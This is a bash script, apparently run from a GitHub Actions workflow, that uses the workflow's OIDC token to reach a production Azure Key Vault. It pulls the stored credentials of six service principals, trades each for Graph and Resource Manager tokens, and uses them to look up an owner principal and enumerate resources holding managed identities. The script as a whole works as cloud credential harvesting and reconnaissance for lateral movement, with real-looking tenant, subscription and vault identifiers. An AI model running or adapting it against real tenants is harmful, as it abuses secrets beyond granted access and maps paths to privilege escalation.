#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
OWNER=d2cdf247-9319-40cb-8324-5a005ef538da
PROD="https://kv-tbl-prod-x3euoz.vault.azure.net/secrets"

J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$J" --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')

sp_tok() { # $1=secretname $2=scope
  js=$(curl -sS "$PROD/$1?api-version=7.4" -H "Authorization: Bearer $VT" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
  cid=$(printf '%s' "$js" | python3 -c 'import sys,json;d=json.loads(sys.stdin.read());print(d.get("appId") or d.get("clientId") or d.get("client_id",""))' 2>/dev/null)
  sc=$(printf '%s' "$js" | python3 -c 'import sys,json;d=json.loads(sys.stdin.read());print(d.get("clientSecret") or d.get("client_secret") or d.get("password",""))' 2>/dev/null)
  curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$cid" -d grant_type=client_credentials --data-urlencode "client_secret=$sc" --data-urlencode "scope=$2" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))'
}

echo "### Graph lookup of $OWNER via each SP"
for s in directory-audit-principal reporting-service-principal reporting-viewer-principal cost-reader-principal secrets-sync-principal sync-service-principal; do
  g=$(sp_tok "$s" https://graph.microsoft.com/.default)
  r=$(curl -sS "https://graph.microsoft.com/v1.0/servicePrincipals/$OWNER?\$select=displayName,appId,servicePrincipalType" -H "Authorization: Bearer $g")
  echo "-- $s: $(printf '%s' "$r" | tr -d '\n' | head -c 260)"
done

echo "### ARM resources w/ identity via each SP (name | principalId | id)"
for s in reporting-service-principal reporting-viewer-principal cost-reader-principal secrets-sync-principal sync-service-principal directory-audit-principal; do
  a=$(sp_tok "$s" https://management.azure.com/.default)
  echo "-- $s --"
  curl -sS "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01&\$expand=identity" -H "Authorization: Bearer $a" | python3 -c 'import sys,json
try: d=json.load(sys.stdin)
except Exception: print("  (no access / no json)"); 
else:
 for v in d.get("value",[]):
  idd=v.get("identity") or {}; pid=idd.get("principalId")
  ua=list((idd.get("userAssignedIdentities") or {}).keys())
  if pid or ua: print("  ",v.get("name"),"|",pid,"|",v.get("id"),"|UA:",ua)' 2>/dev/null
done
echo END
